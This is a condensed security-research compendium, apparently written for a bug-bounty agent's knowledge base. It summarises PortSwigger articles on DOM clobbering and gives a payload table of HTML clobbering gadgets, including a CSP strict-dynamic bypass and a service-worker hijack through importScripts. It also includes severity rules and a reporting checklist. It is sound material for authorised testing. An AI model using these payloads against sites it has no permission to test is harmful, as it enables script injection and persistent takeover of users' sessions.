# DOM Clobbering — Research Articles Compendium

> Source: 3 PortSwigger Research articles on DOM clobbering, 2013-2022 (Heyes, Walkowski). Extracts: `_portswigger-extracts/articles/`. Complements: `dom-based-vulnerabilities-playbook.md`, `articles-csp-bypass-playbook.md`.

## Article Map

| Year | Title | Contribution |
|---|---|---|
| 2013 | (origin) DOM clobbering | Global var shadowing via id/name |
| 2020 | Bypassing CSP via DOM clobbering | Clobber gadget → strict-dynamic script.src rewrite |
| 2021 | Dom clobbering strikes back | 3-level clobber, RadioNodeList, anchor username/password, base href, iframe srcdoc chains |
| 2022 | Hijacking service workers via DOM clobbering | getElementById/querySelector clobber → SW importScripts takeover |

## Key Techniques

- **Element relationships** — only form-related + image elements are clobberable as parents: `form->{button,fieldset,image,img,input,object,output,select,textarea}`. Enumerate pairs with the relationship brute-force snippet (elements array × elements array, check `element1.element2`).
- **Basic clobber** — `<form id=x><output id=y>I've been clobbered</output><script>alert(x.y.value)</script>`. DOM collection via id+name: `<a id=x><a id=x name=y href="Clobbered">` → `x.y`.
- **3 levels** — `<form id=x name=y><input id=z></form><form id=x></form>` → `x.y.z`. >3 levels: iframe `name` → contentWindow as global + srcdoc chains: `<iframe name=a srcdoc="<iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>"></iframe>`. Delay needed → `@import '//portswigger.net'` stylesheet beats setTimeout-free execution.
- **RadioNodeList** — Chrome groups same-name inputs in form: `<form id=x><input id=y name=z><input id=y></form>` → `x.y.forEach(...)` array methods.
- **Anchor username/password** — DOM props (not attrs) via URL creds: `<a id=x href="ftp:Clobbered-username:Clobbered-Password@a">` → `x.username`, `x.password`.
- **Unencoded values** — browser URL-encodes href attrs; bypass with non-special schemes: `<a id=x href="abc:<>">` → `x` = `abc:<>` raw. Firefox: `<base href=a:abc>`. Chrome: `<base href="a://Clobbered<>">` + `<a id=x name=x><a id=x name=xyz href=123>` → `x.xyz` raw.
- **Property enumeration** — clobberable string props per element + controllability check (assign + read back) — two snippets in source; run before hunting sinks.
- **getElementById clobber** — inject `<html id="cdnDomain">` or `<body id=...>` BEFORE/AFTER target: `<div id=cdnDomain>test</div><html id="cdnDomain">clobbered</html>` → `document.getElementById('cdnDomain').innerText` = "clobbered". Hide siblings from innerText with `<style>p{display:none}</style>`.
- **querySelector clobber** — first-match wins: `<div class=x></div><body class=x>` → `document.querySelector('.x')` returns body.
- **Service worker hijack** — SW registered with query params + `importScripts(param)` inside → script injection = permanent client-side takeover (survives refresh). Finding: DOM Invader canary in query string → sink `serviceWorker.register`; or blank-canary mode + filter sink `serviceWorker.register` to list ALL registrations, callback to spot `?` in value.
- **SW via clobbered config** — site passes CDN domain via hidden `<div id=cdnDomain>` → clobber → control `importScripts(`${n}/versionless/...`)` origin → full response control, HTML filter evasion, CSP bypass, XSS escalation.
- **CSP bypass combo** (2020) — attacker injection + clobberable gadget + policy-allowed sink: two anchors clobber config consumed by strict-dynamic'd script → rewrites `script.src` to `data:,alert(1)//`.

## Payload / Bypass Table

| Technique | Sink condition | Exploit |
|---|---|---|
| Basic 2-level | `x.y` reads | `<form id=x><output id=y>` |
| DOM collection | named access | `<a id=x><a id=x name=y href=evil>` |
| 3-level | `x.y.z` | form name=y + input id=z + dup form |
| >3 levels | deep chain | nested iframes srcdoc + style @import delay |
| username/password | URL creds props | `<a id=x href="ftp:u:p@a">` |
| Raw chars | href URL-encoding | scheme `abc:<>` / base href `a://Clob<>` |
| getElementById | id lookup | `<html id=dup>` injection + hide w/ style |
| querySelector | class match | `<body class=x>` injection |
| SW hijack | register(query)+importScripts | DOM Invader canary → inject host |
| SW clobber | getElementById config | `<html id=cdnDomain>` → importScripts origin |
| CSP strict-dynamic | gadget → script.src | `<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>` |

## By-Design / SKIP Filters

- Only form/image element hierarchies clobberable — arbitrary element trees with random ids = dead chain.
- Chrome-only: RadioNodeList forEach; Firefox-only: base-href unencoded variants — engine-gate findings.
- Attributes not in HTML spec have no DOM property (`<form id=x y=123>` → `x.y` undefined) — only spec-defined attrs clobber directly.
- SW hijack needs BOTH: attacker-controlled query param reaching register() AND importScripts influenced by it — either missing = INFO.
- Clobbered value reached but sink validates/sanitizes (e.g. origin allowlist on importScripts) = blocked chain → INFORMATIONAL.
- Dom Invader flag on register() alone: query passing ≠ exploitable — manual SW JS review required.

## Severity Guide

- **HIGH** — SW takeover: importScripts origin controlled (persistent site takeover, survives navigation).
- **MED/HIGH** — CSP bypass w/ script exec in origin (proven alert(document.domain)).
- **MED** — clobbered config alters app behavior to attacker benefit (CDN redirect, config flip) without direct exec.
- **LOW** — clobber works, sink benign (display-only value change).
- **INFO** — sink exists, no injection point to plant clobber elements.
- Injection point absent = chain blocked ⇒ INFORMATIONAL per master KB.

## Reporting Checklist

- [ ] Show injected HTML + clobbered property read-back (console screenshot, both values).
- [ ] Engine + version (Chrome RadioNodeList vs Firefox base-href differences).
- [ ] Sink proof: SW JS source showing `importScripts(param)` / gadget consuming clobbered value.
- [ ] CSP combo: original policy header + rewritten script.src + exec screenshot.
- [ ] SW: demonstrate persistence (reload, malicious response still served) + scope.
- [ ] DOM Invader workflow: canary config, blank-canary registration dump, callback output.
- [ ] Enumerate: relationship/property brute-force snippets run against target sink candidates.
- [ ] Blocked chain (no injectable position) ⇒ INFORMATIONAL per master KB.

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
